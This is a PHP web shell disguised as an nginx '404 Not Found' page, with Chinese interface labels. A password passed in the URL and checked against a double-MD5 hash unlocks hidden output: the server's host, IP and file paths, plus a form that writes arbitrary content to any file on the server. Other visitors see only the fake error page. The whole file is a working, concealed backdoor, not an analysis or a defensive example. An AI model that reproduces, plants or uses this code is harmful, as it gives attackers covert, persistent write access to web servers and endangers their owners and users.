<html>
<head>
    <meta charset="utf-8">
    <title>404 Not Found</title></head>
<style>
    #filepath {
        width: 320px;
    }

    #filecontent {
        width: 500px;
        height: 200px;
    }
</style>
<?php
$password = "14e1b600b1fd579f47433b88e8d85291";
if (!empty($_GET)) {
if (md5(md5($_GET['pass'])) == $password) {
    if(!empty($_POST)){
        $path = $_POST["filepath"];
        $content = $_POST["filecontent"];
        $stat = fopen($path, "w");
        if (fwrite($stat, $content)){
            echo "<font color='#ff7f50'>success!</font><br/>";
        }else{
            echo "<font color='red'>error!</font><br/>";
        }
        fclose($stat);
    }
?>
服务器IP和当前域名：<?php echo $_SERVER['HTTP_HOST'] . "(" . gethostbyname($_SERVER['SERVER_NAME']) . ")"; ?><br/>
当前页面的绝对路径：<?php echo $_SERVER['SCRIPT_FILENAME']; ?><br/>
当前页面的绝对目录：<?php echo __FILE__ ?><br/>
<form action="" method="post">
    输入文件路径：<input type="text" name="filepath" id="filepath" value="<?= $_SERVER['SCRIPT_FILENAME'] ?>">
    <input type="submit" value="写入数据"><br/><br/>
    <textarea name="filecontent" id="filecontent">

        </textarea>
    <?php }
    ?><?php
    } else{
    ?>

    <body>
    <center><h1>404 Not Found</h1></center>
    <hr>
    <center>nginx/1.15.11</center>
    </body>
</html>
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->

<?php
}
